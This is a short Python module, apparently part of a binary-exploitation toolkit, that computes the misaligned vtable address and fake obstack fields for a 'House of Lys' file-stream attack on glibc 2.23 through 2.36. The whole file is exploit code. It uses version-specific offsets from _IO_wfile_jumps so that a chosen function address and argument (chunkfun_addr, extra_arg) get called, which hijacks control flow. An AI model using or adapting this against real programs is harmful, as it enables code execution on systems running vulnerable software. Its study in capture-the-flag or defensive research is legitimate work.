"""House of Lys shifted obstack FILE sink calculations."""
from dataclasses import dataclass
@dataclass(frozen=True)
class LysPlan:
    version: str
    primary_vtable_addr: int
    obstack_addr: int
    object_base: int
    next_free: int
    chunk_limit: int
    chunkfun_addr: int
    extra_arg: int

def build_house_of_lys(*, version: str, wfile_jumps_addr: int,
                       obstack_addr: int, chunkfun_addr: int, extra_arg: int,
                       object_base: int = 0, next_free: int = 1,
                       chunk_limit: int = 0) -> LysPlan:
    """生成 Lys 的错位 primary vtable 和 fake obstack 参数。

    2.23 使用 `_IO_obstack_jumps = _IO_wfile_jumps - 0x1120`；2.24～2.36
    使用 `+0x300`。二者均再加 `+0x20` 使 overflow 槽落到 xsputn。
    """
    if version == '2.23': delta = -0x1120
    elif version in {f'2.{i}' for i in range(24, 37)}: delta = 0x300
    else: raise ValueError('Lys supports glibc 2.23 through 2.36')
    return LysPlan(version, wfile_jumps_addr + delta + 0x20, obstack_addr,
                   object_base, next_free, chunk_limit, chunkfun_addr, extra_arg)
